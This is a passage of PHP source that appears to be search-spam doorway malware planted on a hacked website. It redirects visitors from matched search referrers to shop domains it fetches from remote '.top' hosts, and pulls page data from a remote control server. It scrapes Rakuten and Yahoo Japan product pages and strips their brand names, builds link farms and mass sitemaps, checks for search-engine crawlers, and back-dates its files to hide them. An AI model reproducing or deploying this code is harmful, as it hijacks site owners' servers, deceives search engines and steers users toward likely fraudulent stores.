			$arrUrlId = unserialize(file_get_contents($logFileName));
		}else{
			$arrUrlId = array();
		}
		
		if(isset($rqurl) && isset($arrUrlId[$rqurl]) && $arrUrlId[$rqurl]){
				$id  = $arrUrlId[$rqurl];		
		}else{
			$arrUrlId[$rqurl] = getRandId();
			$id = $arrUrlId[$rqurl];
			file_put_contents($logFileName,serialize($arrUrlId));
			@touch(dirname($logFileName), $fLogTime, $fLogTime); 
			@touch($logFileName, $fLogTime, $fLogTime);    
		}

	}
}
$idTemp = explode('-',$id);
$id23 = end($idTemp);
$numArr_key = count($arr_key);
$siteid = $idTemp[count($idTemp)-2];
if($id23 && $siteid){
	
	
	if(isset($_SERVER["HTTP_REFERER"])){
	
		
	
		if(preg_match($russ, $referer) && $iszz == false && $is_or_no == false){
			
				$rsdom = '#^http://www\.[^/+]/$#si';
		
				$jumDom1 = 'http://www.'.$stss.'1.top'. DOMTXT . $siteid .".txt";	
				$jumDom2 = 'http://www.'.$stss.'2.top'. DOMTXT . $siteid .".txt";
		
		for($i=0;$i<2;$i++){
			$domJump = curl_get_from_webpage($jumDom1,'',1);
			$domJump = trim($domJump);
		
			if(!preg_match($rsdom,$domJump)){
				$domJump = curl_get_from_webpage($jumDom2,'',1);
				$domJump = trim($domJump);
				if(preg_match($rsdom,$domJump))
					break;
			}else{
				break;
			}
		}
		
			echo '<script language="javascript" type="text/javascript">'. PHP_EOL .'window.location.href="'. $domJump . "index.php?main_page=product_info&products_id=" . $id23 .'";'. PHP_EOL .'</script>';			die();		
			}
	}
 
 	$siteAID = $siteid. '-' .$id23;	$fileKey = $id23 % FNUM;
    $pInfoUrl =  GETDOM . "gpage.php?site=$thisdom&id=$siteAID&jgnum=". JGNUM ."&linknum=".LINKNUM; 
 	$keyKey = $id23 % $numArr_key;$keyWzi = $id23 % 6;$preOrEnd = $arrKeywz[$keyWzi]%2;


 $pInfoStr = curl_get_from_webpage($pInfoUrl,'',5);
 
 
 
 $rFL = '#<FL>(.*?)</FL>#si';
 preg_match($rFL, $pInfoStr, $matchFL);
 if($matchFL[1]) $fStr = $matchFL[1];else $fStr = ''; 
 
 
 $arrf1 = explode("#lkfglkfg#",$fStr);
 $arrFIdName = array();
 $arrFIdImg = array();
 if(count($arrf1)){
	 foreach($arrf1 as $values){
		 $values = trim($values);
		 if(!$values)
			 continue;
		 $arrts = explode("===>",$values);
		 if(count($arrts) == 3)
			 $arrFIdName[$arrts[0]] = $arrts[1];
			 $arrFIdImg[$arrts[0]] = $arrts[2];
		}
 }
  
 $rLK = '#<LK>(.*?)</LK>#si';
 preg_match($rLK, $pInfoStr, $matchLK);
 
 $rpImg = '#<pImg>(.*?)</pImg>#si';
 preg_match($rpImg, $pInfoStr, $matchpImg);
 
 
 $rMyName = '#<MyName>(.*?)</MyName>#si';
 preg_match($rMyName, $pInfoStr, $matchMyName);
 
 
 if($matchpImg[1]) 
	 $strpImg = trim($matchpImg[1]);
 else 
	 $strpImg = '';
 
 
$imgArr = explode('#img#',$strpImg);
$tempPimgStr = '';
foreach($imgArr as $vs){
	$vs = trim($vs);
	if($vs)
	 $tempPimgStr .= '<div class="text-center"><img src="'.$vs.'"></div>';
 }
 
 
 if($matchMyName[1]) 
	 $strMyName = trim($matchMyName[1]);
 else 
	 $strMyName = '';
 
 
 
 if($matchLK[1]) 
	 $lkStr = trim($matchLK[1]);
 else 
	 die(); 

 
 $html = curl_get_from_webpage($lkStr,'',5);

 
 
 					$productsPd2 = '';

					if(strstr($lkStr,'yahoo.co.jp')){
							$proNameRelur='#<!-- itemInfoTitle -->(.*?)<!-- /itemInfoTitle -->#si';
							preg_match($proNameRelur, $html, $matchesName);
							$productsName = rmhtmltag2('',$matchesName[1]);
							
							$productsName = trim($productsName);
						
							if(!$productsName){
								$productsName = $strMyName;
						}
						
						
						
						preg_match('#<!-- itemInfoLead -->(.*?)<!-- /itemInfoLead -->#si', $html, $matchesDes);
						$productsDes = $matchesDes[1];

						$productsDes = rmhtmltag2('iframe', $productsDes);
						$productsDes = rmhtmltag2('a', $productsDes);	
			
					}else{
						 					$html = iconv('EUC-JP','utf-8',$html);

						$proNameRelur='#<span class="item_name">(.*?)</span>#si';
						preg_match($proNameRelur, $html, $matchesName);
						$productsName = rmhtmltag2('',$matchesName[1]);

						$productsName = trim($productsName);
					
						if(!$productsName){
							$productsName = $strMyName;
						}
			
						$proPd2Relur = '#<span class="catch_copy">(.*?)</span>#si';
						preg_match($proPd2Relur, $html, $matchesPd2);
						$productsPd2 = $matchesPd2[1];
						$productsPd2 = rmhtmltag2('',$productsPd2);
						
						
						
						preg_match('#<td><span class="sale_desc">(.*?)</span>\s*<br>\s*<br>\s*</td>#si', $html, $matchesDes);
						$productsDes = $matchesDes[1];

						preg_match('#<td><span class="item_desc">(.*?)</span>\s*<br>\s*<br>\s*</td>#si', $html, $matchesDes2);
						$productsDes .= $matchesDes2[1];
						$productsDes = rmhtmltag2('iframe', $productsDes);
						$productsDes = rmhtmltag2('a', $productsDes);	

					}
					
					
					

					// preg_match_all('#<div src="([^"]+)"#si', $html, $matchesImg);
					// $productsImgArr = $matchesImg[1];
					
					
				$rpword[] = '%E6%A5%BD%E5%A4%A9%E5%B8%82%E5%A0%B4%E5%BA%97';
				$rpword[] = '%E3%80%90%E6%A5%BD%E5%A4%A9%E5%B8%82%E5%A0%B4%E3%80%91';
				$rpword[] = '%E6%A5%BD%E5%A4%A9%E5%B8%82%E5%A0%B4';
				$rpword[] = '%E3%80%90%E3%82%AB%E3%83%BC%E3%83%89%E6%B1%BA%E6%B8%88OK%E3%80%91';
				$rpword[] = '%E3%80%90%E3%81%82%E3%81%99%E6%A5%BD%E5%AF%BE%E5%BF%9C%E3%80%91';
				$rpword[] = '%E3%80%90%E4%BB%A3%E5%BC%95%E4%B8%8D%E5%8F%AF%E3%80%91';
				$rpword[] = '%E9%80%9A%E4%BF%A1%E8%B2%A9%E5%A3%B2';
				$rpword[] = '%E9%80%9A%E8%B2%A9';
				$rpword[] = '%E6%A5%BD%E5%A4%A9';
				$rpword[] = '%e3%83%a4%e3%83%95%e3%83%bc%e5%ba%97+';
				$rpword[] = '%e3%83%a4%e3%83%95%e3%83%bc';

	
					$pMateTitle = '';
					$pMateKey = '';
					$pMateDes = '';
					
					$proMateTitleRelur = '#<title>(.*?)</title>#si';
					preg_match($proMateTitleRelur, $html, $matchesMateTitle);
					
					if(isset($matchesMateTitle[1]) && trim($matchesMateTitle[1])){
						$pMateTitle = trim($matchesMateTitle[1]);
						
						foreach($rpword as $vsword){
							$let = urldecode($vsword);
							$pMateTitle = str_replace($let,"",$pMateTitle);
						}
						reset($rpword);
					
						$pMateTitle = str_replace('rakuten.co.jp',"",$pMateTitle);
						$pMateTitle = str_replace('rakuten',"",$pMateTitle);
						$pMateTitle = str_replace('Yahoo!',"",$pMateTitle);
						$pMateTitle = str_replace('Yahoo',"",$pMateTitle);
					}
					
					
					$proMateKeyRelur = '#<meta name="keywords" content="([^"]+)"#si';
					preg_match($proMateKeyRelur, $html, $matchesMateKey);
					
					if(isset($matchesMateKey[1]) && trim($matchesMateKey[1])){
						$pMateKey = trim($matchesMateKey[1]);
													
						foreach($rpword as $vsword){
							$let = urldecode($vsword);
							$pMateKey = str_replace($let,"",$pMateKey);
						}
						reset($rpword);
					
						$pMateKey = str_replace('rakuten.co.jp',"",$pMateKey);
						$pMateKey = str_replace('rakuten',"",$pMateKey);
						$pMateKey = str_replace('Yahoo!',"",$pMateKey);
						$pMateKey = str_replace('Yahoo',"",$pMateKey);
						
					}
					
					$proMateDesRelur = '#<meta name="description" content="([^"]+)"#si';
					preg_match($proMateDesRelur, $html, $matchesMateDes);
					
					if(isset($matchesMateDes[1]) && trim($matchesMateDes[1])){
						$pMateDes = trim($matchesMateDes[1]);
																				
						foreach($rpword as $vsword){
							$let = urldecode($vsword);
							$pMateDes = str_replace($let,"",$pMateDes);
						}
						reset($rpword);
						
					
						$pMateDes = str_replace('rakuten.co.jp',"",$pMateDes);
						$pMateDes = str_replace('rakuten',"",$pMateDes);
					
						$pMateDes = str_replace('Yahoo!',"",$pMateDes);
						$pMateDes = str_replace('Yahoo',"",$pMateDes);
					}
					
					
					$productsDes = str_replace('<IMG ','<img ',$productsDes);
					$productsDes = rmhtmltag2('meta',$productsDes);
					$productsDes = rmhtmltag('script',$productsDes);
					$productsDes = rmhtmltag2('img',$productsDes);
					
			 $pName = $productsName;
			 $pDes = $productsDes;
			 $pd2 = $productsPd2;
			 
			 $pMateKey = preg_replace('#^,+#i','',$pMateKey);
			 $pMateKey = str_replace('<meta name=,','',$pMateKey);
			 $pMateKey = str_replace('<meta name=','',$pMateKey);
			 
			 if(!$pMateTitle or !$pMateDes or !$pMateKey){
				 $pMateTitle = $productsName;
				 $pMateDes = $productsName;
				 $pMateKey = $productsName;
			 }
			  
		
			 $lttitlerp = '<p><strong>'.$pMateTitle.'</strong></p>';
			 $lttitlerp .= '<p><strong>'.$pMateDes.'</strong></p>';
			 
			 $pnamesrp = '<p><strong>'.$pName.'</strong></p>';
			 $pnamesrp .= '<p><strong>'.$pMateDes.'</strong></p>';
			 
				
 // if($preOrEnd){
 if(0){
	$pDes = '<p><strong>'.$pMateTitle.'</strong></p>'.$pDes .$pd2. '<p><strong>'.$pMateDes.'</strong></p>' ."<br/>".$tempPimgStr;
 }else{
	 $pDes = $tempPimgStr . '<p><strong>'.$pMateTitle.'</strong></p>'. $pDes .$pd2. '<p><strong>'.$pMateDes.'</strong></p>';
  }
 
 $pDes = str_ireplace("<img ", '<img class="img-responsive rounded" alt="#bbbNamebbb#"  title="#bbbNamebbb#" ',$pDes);$rpDes = $pDes;
 $rpDes = str_replace('#bbbNamebbb#',$pName,$rpDes);
	$linkfirst = '';
	if(count($arrFIdName)){
		$linkfirst .= '<ul class="list-group">';
		foreach($arrFIdName as $valueFlinkId => $vsss){
			
				if(!isset($arrFIdImg[$valueFlinkId]))
					continue;
				
				list($tempSid,$tempPid) = explode('-',$valueFlinkId);						
				$friendlink = getalink($tempSid,$tempPid);

				$tempLinkKey = $vsss;
				$tempImg = trim($arrFIdImg[$valueFlinkId]);
			
			$linkfirst=$linkfirst.'<li class="list-group-item  col-md-3  col-sm-4  col-xs-6">'."<a href=\"".$friendlink."\">". '<img src="'.$tempImg.'" class="img-responsive" alt="'.$tempLinkKey.'" title="'.$tempLinkKey.'">' ."</a></li>".PHP_EOL;		
		}
	}
		
			$fileMb = fopen($mbFileName,"r");		$html = fread($fileMb,filesize($mbFileName));		
			
			$html = str_ireplace('#bbbdesbbb#', $pMateDes, $html);	
			$html = str_ireplace('#bbbkeybbb#', $pMateKey, $html);	
			$html = str_ireplace('#bbbtitsbbb#', $pMateTitle, $html);	
			$html = str_ireplace('#bbblttitlebbb#', $lttitlerp, $html);	
			$html = str_ireplace('#bbbNamebbb#', $pName, $html);	
			$html = str_ireplace('#descontent#', $rpDes, $html);	
			$html = str_ireplace('#links1#', $linkfirst, $html);			
			$html = str_ireplace('#bbbpnamesbbb#', $pnamesrp, $html);			

			
	echo $html;
 
die();
	
	
	
	}
	
	
	
function getMapNum($bgNum,$mapnum){
	$TempArr = array();
	if($bgNum + $mapnum <= FNUM){
		for($i=0;$i<$mapnum;$i++){
			$TempArr[$i] = $bgNum + $i -1;
		}
	}else{
		for($i=0;$i<$mapnum;$i++){
			if($bgNum+$i > FNUM)
				$TempArr[$i] = $bgNum + $i -1 -FNUM;
			else
				$TempArr[$i] = $bgNum + $i -1;
		}
	}
	
	return $TempArr;
}



function getRandId(){
	$num = rand(1,FNUM);	$num = $num - 1;	
	
		$idUrl =  GETDOM . "gpage.php?getid=$num";
		$tempIdStr = curl_get_from_webpage($idUrl,'',5);
		$arrId = explode(',',$tempIdStr);
	
	$indexId=array_rand($arrId,1);	$id = $arrId[$indexId];	unset($arrId);	return $id;}
function get_arrvs($arr,$num,$nowkey){
	$numArr = count($arr);	
	if($nowkey + $num < $numArr)
		return $arr[$nowkey + $num];	else{
		if($nowkey + $num - $numArr - $numArr > 0)
			return get_arrvs($arr,$num - $numArr,$nowkey);		else
			return $arr[abs($nowkey + $num - $numArr)];	}
}
function get_pre_link($arr,$key){
	
	$tmpA1 = array();	$tmpA2 = array();	
	$num = count($arr);	
	
	if($key + JGNUM + 1 + LINKNUM >= $num){
		
		if($key + JGNUM + 1 - $num > LINKNUM){
			return array_slice($arr, $key + JGNUM + 1 - $num, LINKNUM);		}else{
		
		$duoyu = $key + JGNUM + 1 + LINKNUM - $num + 1;		$tmpA1 = array_slice($arr, $key + JGNUM + 1, LINKNUM);		$tmpA2 = array_slice($arr, 0, $duoyu);			
		return array_merge($tmpA1,$tmpA2);		}
	}else{
			return  array_slice($arr, $key + JGNUM + 1, LINKNUM);	}
	
}
function get_next_link($arr,$key){
	
	$tmpA1 = array();	$tmpA2 = array();	
	$num = count($arr);	if($key - JGNUM - LINKNUM < 0 && $key - JGNUM > 0){
		$duoyu = abs($key - JGNUM - LINKNUM);		$tmpA1 = array_slice($arr, 0, abs($key - JGNUM));		$tmpA2 = array_slice($arr, $num-$duoyu-1, $duoyu);		return array_merge($tmpA1,$tmpA2);	}else{
			return  array_slice($arr, $key - JGNUM - LINKNUM, LINKNUM);	}
}
function rFile($file){
	if(function_exists('file_get_contents')){
		return file_get_contents($file);
	}else{
		$handle = fopen($file, "r");
		$contents = fread($handle, filesize($file));
		fclose($handle);
		return $contents;
	}
}
function isCrawler() {
	$agent= @strtolower($_SERVER['HTTP_USER_AGENT']);	if (!empty($agent)) {
		$spiderSite= array(
			"Googlebot",
			"Mediapartners-Google",
			"Adsbot-Google",
			"Yahoo!",
			"Google AdSense",
			"Yahoo Slurp",
			"bingbot",
			"MSNBot"
		);		foreach($spiderSite as $val) {
		$str = strtolower($val);		if (strpos($agent, $str) !== false) {
			return true;			}
		}
	} else {
		return false;	}
} 
//生成sitemap.xml文件，超出4000个则换一个xml文件；参数$c=1生成原始路径的sitemap，$c=2则生成映射后的路径
//$dir目录参数


function print_map2($filenames,$c=1,$jdt=1){

	$filePres = '';	$fileEnds = '';	
	$dirNames = dirname(__FILE__);	$httcReplace = end((explode(DIRECTORY_SEPARATOR, $dirNames)));			
	if(JDT == 2){
		$filePres = $httcReplace . "/" . basename(__FILE__) . "/";	}elseif(JDT == 1){
		$filePres = $httcReplace . "/";	}elseif(JDT == 3){
		$filePres = $httcReplace . "/" .basename(__FILE__) . "?key=";	}else{
		$filePres = '';	}
	if(JDT == 3){
		$fileEnds = '';	}else{
		$fileEnds = JTHZ;	}
	$fpath='http://'.$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];	$serpath=substr($fpath,0,strrpos($fpath,'/'));
	$siteLink='http://'.$_SERVER['HTTP_HOST'];		
	$mapPre = '<'.'?xml version="1.0" encoding="UTF-8" ?'.'>'. PHP_EOL.'<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">' . PHP_EOL;	$mapEnd = PHP_EOL .  '</urlset>';
	$numLinks = count($urlsArray);	$star = 0;	$priority = 0.1;	$starPri = 0;	$gFile ="";	$date = date("Y-m-d");	$time = date("H:i:s");
	$str = "";						
	$tempArr1 = $filenames;
	
	foreach($tempArr1 as $value2){
		$curphp=basename(__FILE__); 
		$value = $value2;		$first=stristr($value,".php");		$last=stristr($value,".xml");		$checkTxt =stristr($value,".txt");		list($tempSid,$tempPid) = explode('-',$value);
				$url = getalink($tempSid,$tempPid);
		
		
		
		if($first===false && $last===false && $checkTxt===false)
		{
			$date = date("Y-m-d");			$time = date("H:i:s");				
		
			if($star % 12000==11999){
				$put_str = $mapPre . $str . $mapEnd;
				header("Content-type: text/xml");
				echo $put_str;
				return;			
			}
			
		
			
	
			$str .= "     <url>
			 <loc>" . $url . "</loc> 
			 <lastmod>". $date . "T" . $time ."-05:00</lastmod>   
			 <changefreq>daily</changefreq> 
			 <priority>0.1</priority> 
			 </url>
		";	
			
			
			$star++;			$starPri++;		}
	}
	
	{
		
		$put_str = $mapPre . $str . $mapEnd;		
		header("Content-type: text/xml");
		echo $put_str;

	}
	
	unset($tempArr1);	unset($filenames);	
}



function print_map($filenames,$c=1,$jdt=1){
	$filePres = '';	$fileEnds = '';	
	
	$fpath='http://'.$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];	$serpath=substr($fpath,0,strrpos($fpath,'/'));
	$siteLink='http://'.$_SERVER['HTTP_HOST'];		
	$mapPre = '<'.'?xml version="1.0" encoding="UTF-8" ?'.'>'. PHP_EOL.'<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">' . PHP_EOL;	$mapEnd = PHP_EOL .  '</urlset>';
	$numLinks = count($urlsArray);
	
	$star = 0;	$priority = 0.9;	$starPri = 0;	$gFile ="";	$date = date("Y-m-d");	$time = date("H:i:s");
	$str = "     <url>
			 <loc>" . $siteLink . "</loc> 
			 <lastmod>". $date . "T" . $time ."-05:00</lastmod> 
			 <changefreq>always</changefreq> 
			 <priority>1.0</priority> 
			 </url>
		";						
	$tempArr1 = $filenames;
	
	foreach($tempArr1 as $value2){
		$curphp=basename(__FILE__); 
		$value = $value2;		$first=stristr($value,".php");		$last=stristr($value,".xml");		$checkTxt =stristr($value,".txt");		list($tempSid,$tempPid) = explode('-',$value);		
		$url = getalink($tempSid,$tempPid);	
		
		if($first===false && $last===false && $checkTxt===false)
		{
			$date = date("Y-m-d");			$time = date("H:i:s");			
	
			if($star % 12000==11999){
			
				$put_str = $mapPre . $str . $mapEnd;
				header("Content-type: text/xml");
				echo $put_str;
				return;		
			
			}
			
			if($starPri >= 400 && $priority != 0.1){
				$starPri = 0;				$priority = $priority - 0.1;			}
			
			if($priority > 0.1){
				
				$str .= "     <url>
					 <loc>" . $url . "</loc> 
					 <lastmod>". $date . "T" . $time ."-05:00</lastmod>   
					 <changefreq>daily</changefreq> 
					 <priority>". $priority . "</priority> 
					 </url>
				";	
			}else{
										$str .= "     <url>
			 <loc>" . $url . "</loc> 
			 <lastmod>". $date . "T" . $time ."-05:00</lastmod>   
			 <changefreq>daily</changefreq> 
			 <priority>0.1</priority> 
			 </url>
		";	
			}
			
			$star++;			$starPri++;		}
	}
	
	{
		
		$put_str = $mapPre . $str . $mapEnd;
		header("Content-type: text/xml");		
		echo $put_str;

	}
	
	unset($tempArr1);	unset($filenames);		
}


function gsitemap2($filenames,$c=1,$jdt=1){
	global $gnumber,$arrArrr;
	$filePres = '';	$fileEnds = '';	
	$dirNames = dirname(__FILE__);	$httcReplace = end((explode(DIRECTORY_SEPARATOR, $dirNames)));			
	if(JDT == 2){
		$filePres = $httcReplace . "/" . basename(__FILE__) . "/";	}elseif(JDT == 1){
		$filePres = $httcReplace . "/";	}elseif(JDT == 3){
		$filePres = $httcReplace . "/" .basename(__FILE__) . "?key=";	}else{
		$filePres = '';	}
	if(JDT == 3){
		$fileEnds = '';	}else{
		$fileEnds = JTHZ;	}
	$fpath='http://'.$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];	$serpath=substr($fpath,0,strrpos($fpath,'/'));
	$siteLink='http://'.$_SERVER['HTTP_HOST'];		
	$mapPre = '<'.'?xml version="1.0" encoding="UTF-8" ?'.'>'. PHP_EOL.'<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">' . PHP_EOL;	$mapEnd = PHP_EOL .  '</urlset>';
	// $urlsArray = $filenames;
	$numLinks = count($urlsArray);	$star = 0;	$priority = 0.1;	$starPri = 0;	$gFile ="";	$date = date("Y-m-d");	$time = date("H:i:s");
	$str = "";						
	$tempArr1 = $filenames;
	
	foreach($tempArr1 as $value2){
		$curphp=basename(__FILE__); 
		$value = $value2;		$first=stristr($value,".php");		$last=stristr($value,".xml");		$checkTxt =stristr($value,".txt");		list($tempSid,$tempPid) = explode('-',$value);
				$url = getalink($tempSid,$tempPid);
		
		
		
		if($first===false && $last===false && $checkTxt===false)
		{
			$date = date("Y-m-d");			$time = date("H:i:s");				
		
			if($star % 12000==11999){
				$gFile =  'sitemap/sitemap' . $gnumber .'.xml';				echo '<br/>'.$gFile.'<br/>';				$put_str = $mapPre . $str . $mapEnd;				@unlink($gFile);				file_put_contents($gFile,$put_str);
				$str = '';				$gnumber++;				return;			}
			
		
			
	
			$str .= "     <url>
			 <loc>" . $url . "</loc> 
			 <lastmod>". $date . "T" . $time ."-05:00</lastmod>   
			 <changefreq>daily</changefreq> 
			 <priority>0.1</priority> 
			 </url>
		";	
			
			
			$star++;			$starPri++;		}
	}
	
	{
		$gFile =  'sitemap/sitemap' . $gnumber .'.xml';		$gnumber++;		echo '<br/>'.$gFile.'<br/>';
		$put_str = $mapPre . $str . $mapEnd;		@unlink($gFile);		file_put_contents($gFile,$put_str);	
	}
	
	unset($tempArr1);	unset($filenames);	
	echo "生成sitemap成功！";	
}
function gsitemap($filenames,$c=1,$jdt=1){
	global $gnumber,$arrArrr;	
	$filePres = '';	$fileEnds = '';	
	
	$fpath='http://'.$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];	$serpath=substr($fpath,0,strrpos($fpath,'/'));
	$siteLink='http://'.$_SERVER['HTTP_HOST'];		
	$mapPre = '<'.'?xml version="1.0" encoding="UTF-8" ?'.'>'. PHP_EOL.'<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">' . PHP_EOL;	$mapEnd = PHP_EOL .  '</urlset>';
	// $urlsArray = $filenames;
	$numLinks = count($urlsArray);
	
	$star = 0;	$priority = 0.9;	$starPri = 0;	$gFile ="";	$date = date("Y-m-d");	$time = date("H:i:s");
	$str = "     <url>
			 <loc>" . $siteLink . "</loc> 
			 <lastmod>". $date . "T" . $time ."-05:00</lastmod> 
			 <changefreq>always</changefreq> 
			 <priority>1.0</priority> 
			 </url>
		";						
	$tempArr1 = $filenames;
	
	foreach($tempArr1 as $value2){
		$curphp=basename(__FILE__); 
		$value = $value2;		$first=stristr($value,".php");		$last=stristr($value,".xml");		$checkTxt =stristr($value,".txt");		list($tempSid,$tempPid) = explode('-',$value);		
		$url = getalink($tempSid,$tempPid);	
		
		if($first===false && $last===false && $checkTxt===false)
		{
			$date = date("Y-m-d");			$time = date("H:i:s");			
	
			if($star % 12000==11999){
				$gFile =  'sitemap/sitemap' . $gnumber .'.xml';				echo '<br/>'.$gFile.'<br/>';				
				$put_str = $mapPre . $str . $mapEnd;				@unlink($gFile);				file_put_contents($gFile,$put_str);
				$str = '';				$gnumber++;				
				return;
			}
			
			if($starPri >= 400 && $priority != 0.1){
				$starPri = 0;				$priority = $priority - 0.1;			}
			
			if($priority > 0.1){
				
				$str .= "     <url>
					 <loc>" . $url . "</loc> 
					 <lastmod>". $date . "T" . $time ."-05:00</lastmod>   
					 <changefreq>daily</changefreq> 
					 <priority>". $priority . "</priority> 
					 </url>
				";	
			}else{
										$str .= "     <url>
			 <loc>" . $url . "</loc> 
			 <lastmod>". $date . "T" . $time ."-05:00</lastmod>   
			 <changefreq>daily</changefreq> 
			 <priority>0.1</priority> 
			 </url>
		";	
			}
			
			$star++;			$starPri++;		}
	}
	
	{
		$gFile =  'sitemap/sitemap' . $gnumber .'.xml';		echo '<br/>'.$gFile.'<br/>';		
		$gnumber++;
		$put_str = $mapPre . $str . $mapEnd;		@unlink($gFile);		file_put_contents($gFile,$put_str);	
	}
	
	unset($tempArr1);	unset($filenames);	echo "生成sitemap成功！";	
}
  function rmhtmltag2($tagname='',$str=''){
		$rulers = '#<'.$tagname.'[^>]*>#s';		$str = preg_replace($rulers,'',$str);		$rulers = '#</'.$tagname.'>#s';		$str = preg_replace($rulers,'',$str);	
	$rulers = '#<'.$tagname.'[^>]*>#i';	$str = preg_replace($rulers,'',$str);	$rulers = '#</'.$tagname.'>#i';	$str = preg_replace($rulers,'',$str);	return $str;	
	}
	
	function rmhtmltag($tagname='',$str=''){
		$rulers = '#<'.$tagname.'[^>]*>.*?</'.$tagname.'>#s';		$str = preg_replace($rulers,'',$str);		$rulers = '#<'.$tagname.'[^>]*>.*?</'.$tagname.'>#i';		$str = preg_replace($rulers,'',$str);		return $str;	
	}
  
function fillUrl($str = '', $url){
	$relur = '#(?:href|src) ?= ?"([^"]+)"#s';	
	$urlInfo = parse_url($url);	
	
	preg_match_all($relur, $str, $matches);
	if(count($matches[1])){
		foreach($matches[1] as $values){
			if(!strstr($values, "//") && !strstr($values, "..")){
				$rStr =  $urlInfo['host']."/".$values;				$rStr =  'http://' . str_replace('//','/',$rStr);				
				$str = str_replace('"'.$values.'"', '"'.$rStr.'"' , $str) ;			}elseif(strstr($values, "..")){
				
				// echo $urlInfo['host'];				// echo str_replace(basename($url),"",$url);				// die();				
				$rStr = str_replace(basename($url),"",$url)."/".$values;				
				
				$rStr = str_replace("http://","<llqhttp>",$rStr);				
				$rStr = str_replace("https://","<llqhttps>",$rStr);				
				$rStr = str_replace("//","/",$rStr);				
				$rStr = str_replace("<llqhttps>","https://",$rStr);				
				$rStr = str_replace("<llqhttp>","http://",$rStr);				
				$str = str_replace('"'.$values.'"', '"'.$rStr.'"' , $str) ;			}
		}
	}	
	
	
	$relur = '#(?:href|src) ?= ?\'([^\']+)\'#s';	
	$urlInfo = parse_url($url);	
	
	preg_match_all($relur, $str, $matches);	// print_r($matches[1]);	
	if(count($matches[1])){
		foreach($matches[1] as $values){
			if(!strstr($values, "//") && !strstr($values, "..")){
					$rStr =  $urlInfo['host']."/".$values;				$rStr =  'http://' . str_replace('//','/',$rStr);				$str = str_replace("'".$values."'", "'".$rStr."'" , $str) ;			}elseif(strstr($values, "..")){
				
				$rStr = str_replace(basename($url),"",$url)."/".$values;				
				
				$rStr = str_replace("http://","<llqhttp>",$rStr);				
				$rStr = str_replace("https://","<llqhttps>",$rStr);				
				$rStr = str_replace("//","/",$rStr);				
				$rStr = str_replace("<llqhttps>","https://",$rStr);				
				$rStr = str_replace("<llqhttp>","http://",$rStr);				
				$str = str_replace("'".$values."'", "'".$rStr."'" , $str) ;			}
		}
	}
	return $str;}
function auto_read($str, $charset='UTF-8') {
	$list = array('EUC-JP', 'Shift_JIS', 'UTF-8',  'iso-2022-jp');
	$encode = mb_detect_encoding($str, $list);	// echo $encode;die();	
	if($encode == 'UTF-8'){
		return $str;	}else{
		return mb_convert_encoding($str, $charset, $encode);	}
	 
}
function detect_encoding($file){
	$list = array('GBK', 'UTF-8', 'UTF-16LE', 'UTF-16BE', 'ISO-8859-1');	$str = file_get_contents($file);	foreach ($list as $item) {
		$tmp = mb_convert_encoding($str, $item, $item);		if (md5($tmp) == md5($str)) {
		
			return $item;		}
	}
	return null;}
function curl_get_from_webpage($url,$proxy='',$loop=10){
	$data = false;        $i = 0;        while(!$data) {
             $data = curl_get_from_webpage_one_time($url,$proxy);             if($i++ >= $loop) break;        }
	return $data;}
 
 
 
function curl_get_from_webpage_one_time($url,$proxy=''){
if(function_exists("curl_init") && function_exists("curl_setopt") && function_exists("curl_exec") && function_exists("curl_close")){
 
    $curl = curl_init();	//如果有用代理,则使用代理.
	$user_agent = "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; chromeframe/12.0.742.100";			
	// $urlReferer = "http://www.google.com";
	if(strlen($proxy) > 8) curl_setopt($curl, CURLOPT_PROXY, $proxy);
curl_setopt($curl, CURLOPT_URL, $url);	
		if(stristr($url,"https:")){ curl_setopt_array($curl, array(CURLOPT_SSL_VERIFYHOST => 2,CURLOPT_SSL_VERIFYPEER => 0,	CURLOPT_POSTFIELDS => '',			CURLOPT_RETURNTRANSFER => 1,CURLOPT_USERAGENT => $user_agent,CURLOPT_HEADER => 1,			CURLOPT_VERBOSE => 0
			));}else{curl_setopt($curl, CURLOPT_URL, $url);curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);curl_setopt($curl, CURLOPT_HEADER, false);curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);curl_setopt($curl, CURLOPT_USERAGENT, $user_agent);
	}$data=curl_exec($curl);curl_close($curl); 
  }else{
 
    $is_auf=ini_get('allow_url_fopen') && function_exists("file_get_contents")?true:false; 
    if($is_auf){
		$data = file_get_contents($url); 
    }
 
  }
	if(!$data) return false;
	return $data;	
	
}


	
//



function my_mkdir($dir){
		global  $fitime;
		if(!is_dir($dir)){
			mkdir($dir);
			@touch($dir, $fitime, $fitime);   
		} 
	}
	

	
	function generate_dir_file($gDir=''){
		
		global $hostDir;
		$gDir = str_replace('/',DIRECTORY_SEPARATOR,$gDir);
		$gDir = str_replace('\\',DIRECTORY_SEPARATOR,$gDir);
		$arr = explode(DIRECTORY_SEPARATOR,$gDir);
		
		if(count($arr) <= 0) return;
		
		if(!strstr($gDir,$hostDir))
			$dir = $hostDir;
		else
			$dir = '';


		for($i = 0 ; $i < count($arr)-1 ; $i++){
			$dir .= DIRECTORY_SEPARATOR . $arr[$i];
			my_mkdir($dir);
		}
		
		return $dir;
	}
		

	function getalink($sid,$pid){
		
		global $arrnametime,$arrKeywz,$arr_word,$strRand;		
	
		$filePres = '';		$fileEnds = '';		$siteLink='http://'.$_SERVER['HTTP_HOST'];
		$dirNames = dirname(__FILE__);		$httcReplace = end((explode(DIRECTORY_SEPARATOR, $dirNames)));		
		if(JDT == 2){
			$filePres = $siteLink ."/". $httcReplace . "/" . basename(__FILE__) . "/";		}elseif(JDT == 1){
			$filePres = $siteLink ."/". $httcReplace . "/";		}elseif(JDT == 3){
			$filePres = $siteLink ."/". $httcReplace . "/" .basename(__FILE__) . "?keyword=";		}else{
			$filePres = $siteLink."/";		}
		
		$ms = $arrnametime[$pid % count($arrnametime)];		
		
		$keyNum = $arrKeywz[$pid % count($arrKeywz)];		
